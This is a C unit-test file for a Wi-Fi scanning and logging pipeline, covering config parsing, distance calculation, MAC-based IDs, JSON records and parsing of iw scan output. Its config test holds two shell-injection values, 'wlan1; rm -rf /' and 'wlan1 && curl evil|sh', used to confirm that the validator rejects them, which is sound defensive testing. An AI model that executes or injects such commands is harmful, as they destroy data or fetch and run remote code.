/**
 * test_pipeline.c — host unit tests for the portable pipeline modules.
 * Plain-C asserts (firmware tests/ style). Built as `wdm_tests`; run `./build/wdm_tests`.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>

#include "config.h"
#include "geo.h"
#include "hwid.h"
#include "recordfmt.h"
#include "scan_parse.h"

static int g_fail = 0, g_pass = 0;
#define CHECK(cond, msg) do { \
    if (cond) { g_pass++; } \
    else { g_fail++; printf("  FAIL: %s  (%s:%d)\n", msg, __FILE__, __LINE__); } \
} while (0)
#define CHECK_STR(got, want, msg) do { \
    if (strcmp((got),(want)) == 0) { g_pass++; } \
    else { g_fail++; printf("  FAIL: %s\n    got : %s\n    want: %s\n", msg, got, want); } \
} while (0)

/* ── config ─────────────────────────────────────────────────────── */
static void test_config(void)
{
    const char *path = "/tmp/wdm_test_config.txt";
    FILE *f = fopen(path, "w");
    fputs("# comment line\n"
          "\n"
          "api_key = wdm_abc123\n"
          "server_url=https://example.test/api/v1/scans\n"
          "device_name = Garage Pi\n"
          "units=metric\n"
          "scan_iface=wlan0\n"
          "scan_interval_s=20\n"
          "keep_uploaded=true\n"
          "unknown_future_key=whatever\n", f);
    fclose(f);

    CHECK(config_load(path) == true, "config_load returns true for existing file");
    const wdm_config_t *c = config_get();
    CHECK_STR(c->api_key, "wdm_abc123", "api_key parsed + trimmed");
    CHECK_STR(c->server_url, "https://example.test/api/v1/scans", "server_url parsed");
    CHECK_STR(c->device_name, "Garage Pi", "device_name keeps internal space, trims ends");
    CHECK(c->use_metric == true, "units=metric -> use_metric");
    CHECK_STR(c->scan_iface, "wlan0", "scan_iface parsed");
    CHECK(c->scan_interval_s == 20, "scan_interval_s parsed");
    CHECK(c->keep_uploaded == true, "keep_uploaded parsed");

    CHECK(config_load("/tmp/does_not_exist_wdm.txt") == false, "missing file returns false");

    /* Security: scan_iface is interpolated into iw/ip shell commands, so a value
     * with shell metacharacters must be rejected (keeps the previous value). */
    config_set("scan_iface", "wlan1; rm -rf /");
    CHECK_STR(c->scan_iface, "wlan0", "malicious scan_iface rejected (kept previous)");
    config_set("scan_iface", "wlan1 && curl evil|sh");
    CHECK_STR(c->scan_iface, "wlan0", "scan_iface with spaces/&& rejected");
    config_set("scan_iface", "wlan1");
    CHECK_STR(c->scan_iface, "wlan1", "valid scan_iface accepted");
}

/* ── geo ────────────────────────────────────────────────────────── */
static void test_geo(void)
{
    CHECK(wdm_haversine_m(42.0, -84.0, 42.0, -84.0) == 0.0, "identical points -> 0 m");
    double d = wdm_haversine_m(0.0, 0.0, 1.0, 0.0);   /* 1 deg latitude ~111.2 km */
    CHECK(fabs(d - 111195.0) < 1112.0, "1 deg latitude ~= 111 km (within 1%)");
    double near = wdm_haversine_m(42.732500, -84.555500, 42.732600, -84.555500);
    CHECK(near > 10.0 && near < 12.0, "~0.0001 deg lat ~= 11 m");
}

/* ── hwid ───────────────────────────────────────────────────────── */
static void test_hwid(void)
{
    char id[13];
    wdm_hwid_from_mac("b8:27:eb:de:cf:0d", id, sizeof id);
    CHECK_STR(id, "B827EBDECF0D", "MAC -> 12 hex uppercase, colons stripped");
    wdm_hwid_from_mac("00:0F:60:01:C8:72", id, sizeof id);
    CHECK_STR(id, "000F6001C872", "already-upper MAC");
}

/* ── recordfmt ──────────────────────────────────────────────────── */
static void test_recordfmt(void)
{
    wdm_ap_t ap = {0};
    strcpy(ap.bssid, "AA:BB:CC:DD:EE:FF");
    strcpy(ap.ssid, "MyNet");
    ap.rssi = -67; ap.channel = 6; strcpy(ap.enc, "WPA2");
    ap.lat = 42.7325; ap.lon = -84.5555; ap.alt_m = 271.3;
    ap.speed_kmh = 12.5; ap.hdop = 0.9; ap.sats = 9;
    strcpy(ap.iso_time, "2026-05-14T14:23:01Z");

    char buf[512];
    int n = wdm_record_to_json(buf, sizeof buf, &ap);
    CHECK(n > 0, "record formats without truncation");
    CHECK_STR(buf,
        "{\"bssid\":\"AA:BB:CC:DD:EE:FF\",\"ssid\":\"MyNet\",\"rssi\":-67,\"ch\":6,"
        "\"enc\":\"WPA2\",\"lat\":42.732500,\"lon\":-84.555500,\"alt\":271.3,"
        "\"spd\":12.5,\"hdop\":0.9,\"sats\":9,\"ts\":\"2026-05-14T14:23:01Z\"}",
        "record line is byte-identical to firmware format");

    /* SSID escaping: a quote and a backslash must escape; empty SSID is valid. */
    strcpy(ap.ssid, "Say \"Hi\"\\");
    wdm_record_to_json(buf, sizeof buf, &ap);
    CHECK(strstr(buf, "\"ssid\":\"Say \\\"Hi\\\"\\\\\"") != NULL, "ssid quotes + backslash escaped");
    strcpy(ap.ssid, "");
    wdm_record_to_json(buf, sizeof buf, &ap);
    CHECK(strstr(buf, "\"ssid\":\"\"") != NULL, "empty ssid -> \"\"");
}

/* ── scan_parse ─────────────────────────────────────────────────── */
static const char IW_SAMPLE[] =
"BSS aa:bb:cc:dd:ee:ff(on wlan1)\n"
"\tfreq: 2437\n"
"\tsignal: -67.00 dBm\n"
"\tSSID: MyNet\n"
"\tDS Parameter set: channel 6\n"
"\tBSS Load:\n"                            /* indented IE — must NOT start a block */
"\t\t * station count: 3\n"
"\t\t * channel utilisation: 57/255\n"
"\tRSN:\t * Version: 1\n"
"\t\t * Group cipher: CCMP\n"
"\t\t * Pairwise ciphers: CCMP\n"
"\t\t * Authentication suites: PSK\n"
"\tcapability: ESS Privacy ShortSlotTime (0x0411)\n"
"BSS 11:22:33:44:55:66(on wlan1)\n"
"\tfreq: 5180\n"
"\tsignal: -72.50 dBm\n"
"\tSSID: Guest\n"
"\tcapability: ESS (0x0401)\n"
"BSS de:ad:be:ef:00:01(on wlan1)\n"
"\tfreq: 2462\n"
"\tsignal: -45.00 dBm\n"
"\tSSID: \n"
"\tDS Parameter set: channel 11\n"
"\tRSN:\t * Version: 1\n"
"\t\t * Authentication suites: SAE\n"
"\tcapability: ESS Privacy (0x0411)\n"
"BSS 00:00:00:00:00:0a(on wlan1)\n"
"\tfreq: 2412\n"
"\tsignal: -80.00 dBm\n"
"\tSSID: OldRouter\n"
"\tcapability: ESS Privacy (0x0411)\n"
"BSS 00:00:00:00:00:0b(on wlan1)\n"
"\tfreq: 2417\n"
"\tsignal: -55.00 dBm\n"
"\tSSID: Mixed\n"
"\tWPA:\t * Version: 1\n"
"\t\t * Authentication suites: PSK\n"
"\tRSN:\t * Version: 1\n"
"\t\t * Authentication suites: PSK\n"
"\tcapability: ESS Privacy (0x0411)\n";

static void test_scan_parse(void)
{
    CHECK(wdm_freq_to_channel(2412) == 1,  "freq 2412 -> ch 1");
    CHECK(wdm_freq_to_channel(2437) == 6,  "freq 2437 -> ch 6");
    CHECK(wdm_freq_to_channel(2484) == 14, "freq 2484 -> ch 14");
    CHECK(wdm_freq_to_channel(5180) == 36, "freq 5180 -> ch 36");
    CHECK(wdm_freq_to_channel(5745) == 149,"freq 5745 -> ch 149");

    wdm_ap_t aps[16];
    int n = wdm_parse_iw_scan(IW_SAMPLE, aps, 16);
    CHECK(n == 5, "parsed 5 BSS blocks");
    if (n < 5) return;

    CHECK_STR(aps[0].bssid, "AA:BB:CC:DD:EE:FF", "ap0 bssid upper");
    CHECK_STR(aps[0].ssid, "MyNet", "ap0 ssid");
    CHECK(aps[0].rssi == -67, "ap0 rssi");
    CHECK(aps[0].channel == 6, "ap0 channel from DS param");
    CHECK_STR(aps[0].enc, "WPA2", "ap0 enc RSN+PSK -> WPA2");

    CHECK_STR(aps[1].ssid, "Guest", "ap1 ssid");
    CHECK(aps[1].rssi == -73, "ap1 rssi -72.50 rounds away from zero");
    CHECK(aps[1].channel == 36, "ap1 channel from freq 5180");
    CHECK_STR(aps[1].enc, "Open", "ap1 no RSN/WPA/Privacy -> Open");

    CHECK_STR(aps[2].ssid, "", "ap2 hidden ssid empty");
    CHECK(aps[2].channel == 11, "ap2 channel from DS param");
    CHECK_STR(aps[2].enc, "WPA3", "ap2 RSN+SAE -> WPA3");

    CHECK(aps[3].channel == 1, "ap3 channel from freq 2412");
    CHECK_STR(aps[3].enc, "WEP", "ap3 Privacy only -> WEP");

    CHECK(aps[4].channel == 2, "ap4 channel from freq 2417");
    CHECK_STR(aps[4].enc, "WPA/2", "ap4 WPA+RSN -> WPA/2");
}

int main(void)
{
    printf("== wdm pipeline tests ==\n");
    test_config();
    test_geo();
    test_hwid();
    test_recordfmt();
    test_scan_parse();
    printf("\n%d passed, %d failed\n", g_pass, g_fail);
    return g_fail ? 1 : 0;
}
